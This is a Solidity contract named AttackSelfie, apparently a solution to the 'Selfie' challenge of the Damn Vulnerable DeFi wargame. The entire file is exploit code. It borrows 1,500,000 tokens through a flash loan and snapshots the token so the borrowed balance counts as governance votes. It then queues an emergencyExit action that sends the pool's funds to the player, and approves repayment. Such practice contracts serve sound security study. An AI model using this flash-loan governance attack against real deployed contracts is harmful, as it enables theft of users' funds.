// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableTokenSnapshot private token;
    ERC20Snapshot private tokenS;
    address private player;
    address private target;

    constructor(address _pool, address _governance, address _player, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        player = _player;
        token = DamnValuableTokenSnapshot(_token);
        tokenS = ERC20Snapshot(_token);
        target = _token;
    }

    function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata _data)
        external
        returns (bytes32)
    {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);

        token.snapshot();
        governance.queueAction(address(pool), 0, data);
        tokenS.approve(address(pool), _amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        pool.flashLoan(this, address(tokenS), 1500000 ether, "");
    }
}
